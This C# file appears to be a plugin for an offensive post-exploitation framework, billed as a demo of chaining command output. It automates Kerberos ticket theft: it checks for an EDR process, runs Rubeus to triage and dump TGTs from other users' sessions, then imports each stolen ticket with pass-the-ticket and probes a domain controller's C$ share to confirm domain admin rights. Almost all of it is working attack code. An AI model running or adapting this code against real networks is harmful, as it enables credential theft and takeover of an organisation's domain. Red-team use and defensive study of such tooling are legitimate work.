using NHAPI;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TestPlugin
{
    public class Plugin : NHAPI.PluginBase
    {
        //required construcor to pass associated Console object to base class.
        public Plugin(object console) : base(console) { }

        public override string[] RequiredArgs => new string[] { };


        protected override string HelpText => "demo script showing how command output can be parsed and piped in as input for further commands";


        public override void Run(string args, DetailedMachineInfo detailedInfo)
        {
            //Get some additional information on the current system from the DetailedMachineInfo object passed in to the plugin
            nhFunctions.PrintToConsole(string.Format("Machine name: {0} \nPID: {1}\nProcess Name:{2}\nRunning As:{3}\nIntegrity:{4} ", detailedInfo.MachineName, detailedInfo.PID, detailedInfo.ProcessName, detailedInfo.UserName, detailedInfo.IntegrityLevel));

            Guid retVal = nhFunctions.ProcessList_RetrieveResults();

            string enumProcsStr = OutputRetrieval.GetJobOutput(retVal, true, 60);
            bool performHIChecks = false;

            if(enumProcsStr.IndexOf("BirdBasedEDR.exe", StringComparison.OrdinalIgnoreCase) > -1)
            {
                nhFunctions.PrintToConsole("[*] Found BirdBasedEDR.exe running on system, opting to only perform actions known to bypass this EDR");
                performHIChecks = true;
            }
            else
            {
                nhFunctions.PrintToConsole("[*] BirdBasedEDR not running, continuing as this is a demo...");
                performHIChecks = true;
            }

            if(detailedInfo.IntegrityLevel != EIntegrityLevel.High)
            {
                nhFunctions.PrintToConsole("[*] Not running in a high integrity context, exiting as we won't be able to grab tickets for other sessions");
                return;
            }

            if (performHIChecks == true)
            {
                nhFunctions.PrintToConsole("[*] Running in high integrity context, triaging all TGTs on system");
                //example of how to run inproc-execute-assembly from a plugin. Requires Rubeus.exe to exist in the same directory as the plugin script (Plugins/AutoRuns folder)
                retVal = nhFunctions.InProcExecuteAssembly_RetrieveResults("Rubeus.exe", "triage /service:krbtgt");
                string[] TGTs = OutputRetrieval.GetJobOutput(retVal, true, 30).Split(new string[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);

                if(TGTs.FirstOrDefault(x => x.IndexOf("Unhandled Rubeus exception") > -1) != null)
                {
                    nhFunctions.PrintToConsole("[!] Encountered Rubeus error - attempting to run once more before exiting");
                    retVal = nhFunctions.InProcExecuteAssembly_RetrieveResults("Rubeus.exe", "triage");
                    TGTs = OutputRetrieval.GetJobOutput(retVal, true, 30).Split(new string[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                }

                //parse initial rubeus output, perform additional operations on any identified TGTs to determine which we'll use to attempt auth with               
                Dictionary<string, SessionInfo> mostRecentTGT = new Dictionary<string, SessionInfo>(StringComparer.OrdinalIgnoreCase);
                foreach (string TGTLine in TGTs.Where(x => x.IndexOf("@") > -1))
                {
                    string tgtUser = TGTLine.Split('|')[2].Split(' ')[1];
                    //only check tickets for other user sessions on the system
                    if (tgtUser.IndexOf('$') > -1 || tgtUser.Equals(detailedInfo.UserName, StringComparison.OrdinalIgnoreCase))
                    {
                        continue;
                    }
                    //get other pertinent session data
                    DateTime expiration = DateTime.Parse(TGTLine.Split('|')[4].Trim());
                    string luid = TGTLine.Split('|')[1].Trim();
                    //if this is the first TGT we've recovered for a principal, automatically add it to dictionary of TGTs to make attempts with
                    if (!mostRecentTGT.ContainsKey(tgtUser))
                    {
                        mostRecentTGT.Add(tgtUser, new SessionInfo(expiration,luid));
                    }
                    //if not first TGT, compare expiration time to only use most recent one for a given principal
                    else
                    {
                        //if prior datetime is before current dt, update ticket.
                        if (DateTime.Compare(mostRecentTGT[tgtUser].Expiration,expiration) < 0)
                        {
                            mostRecentTGT[tgtUser] = new SessionInfo(expiration,luid);
                        }
                    }
                }

                //perform operations on all candidate TGTs (most-recent TGTs for all other user sessions on the current system)
                bool admin = false;
                foreach(KeyValuePair <string,SessionInfo> session in mostRecentTGT)
                {
                    nhFunctions.PrintToConsole("[*] TGT associated with another user session identified, attempting to extract");
                    //attempt to extract TGT for target logon session
                    retVal = nhFunctions.InProcExecuteAssembly_RetrieveResults("Rubeus.exe", "dump /nowrap /service:krbtgt /luid:" + session.Value.LUID);
                    string[] ticketResults = OutputRetrieval.GetJobOutput(retVal, true, 30).Split(new string[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);

                    nhFunctions.PrintToConsole(string.Format("[*] Retrieved TGT for {0} from LUID {1}, loading into an impersonation context and checking privileges", session.Key, session.Value.LUID));
                    string b64Ticket = ticketResults.OrderByDescending(x => x.Length).FirstOrDefault().Trim();

                    //create a new impersonation context to load the recovered TGT into. Credentials dont matter as we'll be using the recovered TGT for auth.
                    retVal = nhFunctions.ImpersonateUser_RetrieveResults("a", "a", ImpersonationType.network);
                    OutputRetrieval.GetJobOutput(retVal);
                    retVal = nhFunctions.InProcExecuteAssembly_RetrieveResults("Rubeus.exe", "ptt /ticket:" + b64Ticket);
                    string ticketImportRes = OutputRetrieval.GetJobOutput(retVal);
                    if (ticketImportRes.IndexOf("[X] Error ") > -1)
                    {
                        nhFunctions.RevertToSelf();
                        nhFunctions.PrintToConsole("[x] Error importing ticket, continuing with next available TGT ", TextColors.Red);
                        continue;
                    }
                    //Hardcoded target DC here for demo environment vs. doing a lookup. In reality, would run another BOF or assembly here to retrieve the current DC, or just default to \\domainName\c$ 
                    retVal = nhFunctions.LS_RetrieveResults(@"\\corpdc01\c$");
                    string lsRes = OutputRetrieval.GetJobOutput(retVal);

                    if (lsRes.IndexOf("Failed to list path") == -1)
                    {
                        nhFunctions.PrintToConsole("[+] Looks like we're domain admins now :) ", TextColors.LightGreen);
                        admin = true;
                        break;
                    }
                }
                if(!admin)
                {
                    nhFunctions.PrintToConsole("[*] Exhausted all available candidate TGTs and still not admin :(");
                }                
            }          
        }       
    }
    internal class SessionInfo
    {
        public DateTime Expiration { get; }
        public String LUID { get; }
        public SessionInfo(DateTime Expiration, String LUID)
        {
            this.Expiration = Expiration;
            this.LUID = LUID;
        }
    }
}
